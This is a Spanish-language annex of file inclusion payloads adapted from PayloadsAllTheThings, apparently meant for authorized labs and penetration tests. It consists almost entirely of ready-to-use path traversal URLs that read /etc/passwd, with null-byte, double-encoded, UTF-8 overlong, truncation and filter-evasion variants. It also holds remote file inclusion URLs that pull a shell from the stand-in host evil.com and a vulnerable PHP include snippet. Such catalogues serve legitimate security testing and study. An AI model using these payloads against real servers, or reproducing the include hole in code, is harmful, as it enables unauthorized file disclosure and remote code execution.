# Path Traversal y LFI: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [File Inclusion/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/File%20Inclusion/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inclusión de archivos / Inclusión local de archivos

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

```powershell
http://example.com/index.php?page=../../../etc/passwd
```

### Variantes presentes en tablas o texto del apartado

```text
/etc/passwd
Directory & Path Traversal
```

## 2. Inclusión local de archivos / Byte nulo

```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```

```ps1
{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
```

### Variantes presentes en tablas o texto del apartado

```text
%00
```

## 3. Inclusión local de archivos / Doble Codificación

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

## 4. Inclusión local de archivos / UTF-8 Codificación

```powershell
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

## 5. Inclusión local de archivos / Truncamiento de ruta

```powershell
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

### Variantes presentes en tablas o texto del apartado

```text
4096
```

## 6. Inclusión local de archivos / Evasión de filtros

```powershell
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

## 7. Inclusión de archivos / Inclusión remota de archivos

```ini
allow_url_include = On
```

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt
```

### Variantes presentes en tablas o texto del apartado

```text
allow_url_include
```

## 8. Inclusión remota de archivos / Byte nulo

```powershell
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

## 9. Inclusión remota de archivos / Doble Codificación

```powershell
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

## 10. Inclusión remota de archivos / Evasión de allow_url_include

### Variantes presentes en tablas o texto del apartado

```text
allow_url_include
allow_url_fopen
shell.php
http://example.com/index.php?page=\\10.0.0.1\share\shell.php
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
